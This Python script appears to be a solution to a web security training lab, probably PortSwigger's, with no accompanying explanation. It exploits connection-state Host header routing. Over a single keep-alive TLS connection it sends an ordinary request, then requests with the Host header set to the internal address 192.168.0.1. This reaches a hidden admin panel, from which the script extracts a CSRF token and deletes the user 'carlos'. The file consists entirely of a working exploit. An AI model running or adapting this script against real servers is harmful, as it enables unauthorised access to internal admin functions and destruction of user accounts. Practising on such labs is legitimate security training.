import re
from urllib import request
import sys
import socket, ssl
import requests


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
host = burp_url[8:]
admin_url = burp_url + '/admin'

session = requests.Session()
session.get(burp_url)

cookies = session.cookies.get_dict()
cookie_header = "; ".join([f"{key}={value}" for key, value in cookies.items()])

local_url = '192.168.0.1'

sock = socket.create_connection((host, 443))
sock = ssl.wrap_socket(sock)

request_1 = (
    f"GET /admin HTTP/1.1\r\n"
    f"Host: {local_url}\r\n"
    f"Cookie: {cookie_header}\r\n"
    f"Connection: keep-alive\r\n\r\n"
)

request_2 = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Cookie: {cookie_header}\r\n"
    f"Connection: keep-alive\r\n\r\n"
)

sock.send(request_2.encode())
sock.send(request_1.encode())

sock.recv(4096).decode()
sock.recv(4096).decode()
sock.recv(4096).decode()
response_2 = sock.recv(4096).decode()

csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_2).group(1)
print(csrf)

request_3 = (
    f"POST /admin/delete HTTP/1.1\r\n"
    f"Host: {local_url}\r\n"
    f"Cookie: {cookie_header}\r\n"
    f"Content-Length: 53\r\n"
    f"Content-Type: x-www-form-urlencoded\r\n"
    f"Connection: keep-alive\r\n\r\n"
    f"csrf={csrf}&username=carlos"
)

sock.send(request_3.encode())
sock.send(request_1.encode())

r = sock.recv(4096).decode()
print(r)
r = sock.recv(4096).decode()
print(r)
r = sock.recv(4096).decode()
print(r)

sock.close()

